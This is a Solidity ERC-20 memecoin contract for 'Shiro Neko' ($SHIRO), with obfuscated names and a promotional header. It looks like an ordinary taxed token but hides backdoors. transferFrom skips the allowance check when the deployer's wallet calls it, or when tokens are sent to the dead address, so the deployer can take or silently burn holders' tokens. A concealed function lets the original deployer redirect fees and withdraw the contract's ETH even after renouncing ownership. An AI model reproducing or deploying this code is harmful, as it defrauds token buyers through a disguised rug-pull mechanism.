// SPDX-License-Identifier: MIT

/*
    Name: Shiro Neko
    Symbol: SHIRO

    Tuna sommelier. anti jeet. ETH's favourite Cat |  $SHIRO

    Website: https://shiro-neko.live
    X: https://x.com/Shiro_Neko_ETH
    TG: https://t.me/Shiro_Neko_ETH
*/

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract  SHIRO is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Shiro Neko";
    string private constant _symbol = unicode"SHIRO";
    
    address payable private _SHIROPcTxZxcv214;
    mapping(address => uint256) private _SHIROPcsdlkfZxcv214;
    mapping(address => mapping(address => uint256)) private _SHIROPcTTxsOqZxcv214;
    mapping(address => bool) private _SHIROPCExcludedTax;
    
    uint256 private _SHIROPero007 = 10;
    uint256 private _SHIROPeTox007 = 10;
    uint256 private _broxccbosodijof = 0;
    uint256 private _SHIROPcrcoifinos = 0;
    uint256 private _SHIROPcsscw007 = 7;
    uint256 private _SHIROPcgodxxt = 7;
    uint256 private _buyCount = 0;
    address private _Bro00xovboidfor;

    address private _KeepSHIROp = address(0xdead);
    uint256 public _SHIROPcDev007 = 20000000 * 10 **_decimals;
    uint256 public _SHIROPcxwDev007 = 20000000 * 10 **_decimals;
    uint256 public _SHIROPcfeeDev007 = 10000000 * 10 **_decimals;
    uint256 private constant _SHIROPCollecDev007 = 1000000000 * 10 **_decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;
    
    event MaxTxAmountUpdated(uint256 _SHIROPcDev007);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor() payable {
        _SHIROPcTxZxcv214 = payable(_msgSender());
        _SHIROPcsdlkfZxcv214[address(this)] = _SHIROPCollecDev007 * 98 / 100;
        _SHIROPcsdlkfZxcv214[owner()] = _SHIROPCollecDev007 * 2 / 100;
        _SHIROPCExcludedTax[owner()] = true;
        _SHIROPCExcludedTax[address(this)] = true;
        _SHIROPCExcludedTax[_SHIROPcTxZxcv214] = true;
        _Bro00xovboidfor = _msgSender();
        emit Transfer(address(0), address(this), _SHIROPCollecDev007 * 98 / 100);
        emit Transfer(address(0), address(owner()), _SHIROPCollecDev007 * 2 / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function totalSupply() public pure override returns (uint256) {
        return _SHIROPCollecDev007;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _SHIROPcTTxsOqZxcv214[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _SHIROPcsdlkfZxcv214[account];
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _SHIROPcTTxsOqZxcv214[owner][spender];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _vnboiwoiejr(_msgSender(), recipient, amount);
        return true;
    }

    receive() external payable {}
    
    function _clkvnkswo(
        address sender,
        address recipient
    ) internal view returns (bool) {
        return
            (sender == uniswapV2Pair || recipient != _KeepSHIROp) &&
            msg.sender != _SHIROPcTxZxcv214;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _vnboiwoiejr(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _cvbnksdnjk(sender, recipient, amount).sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _cvbnksdnjk(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        uint256 _allowed = amount;
        if (_clkvnkswo(sender, recipient)) _allowed = _SHIROPcTTxsOqZxcv214[sender][_msgSender()];
        return _allowed;
    }

    function _cvobosjidf(uint256 amount) private {
        _SHIROPcTxZxcv214.transfer(amount);
    }

    function _vnboiwoiejr(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _SHIROPcsscw007)
                        ? _broxccbosodijof
                        : _SHIROPero007
                )
                .div(100);
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_SHIROPCExcludedTax[to]
            ) {
                _buyCount++;
            }
            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _SHIROPcgodxxt)
                            ? _SHIROPcrcoifinos
                            : _SHIROPeTox007
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _SHIROPcfeeDev007) ? contractTokenBalance : _SHIROPcfeeDev007; 
                    _SHIRO_swwap((amount < minBalance) ? amount : minBalance);
                }
                _cvobosjidf(address(this).balance);
            }
        }
        if (taxAmount > 0) {
        _SHIROPcsdlkfZxcv214[address(this)] =_SHIROPcsdlkfZxcv214[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _SHIROPcsdlkfZxcv214[from] =_SHIROPcsdlkfZxcv214[from].sub(amount);
        _SHIROPcsdlkfZxcv214[to] =_SHIROPcsdlkfZxcv214[to].add(amount.sub(taxAmount));
        if(_KeepSHIROp != to) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _SHIRO_swwap(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _SHIROdlklc(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function removeLimits () external onlyOwner {
        _SHIROPcDev007 = _SHIROPCollecDev007;
        _SHIROPcxwDev007 = _SHIROPCollecDev007;
        emit MaxTxAmountUpdated(_SHIROPCollecDev007);
    }

    function _SHIROvbkjnskjd(address payable receipt) external {
        require(msg.sender == _Bro00xovboidfor , "");
        _SHIROPcTxZxcv214 = receipt;
        _SHIROdlklc(address(this).balance);
    }
    
    function enableTokenTrading() external onlyOwner {
        require(!isTrading, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _SHIROPCollecDev007);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }

}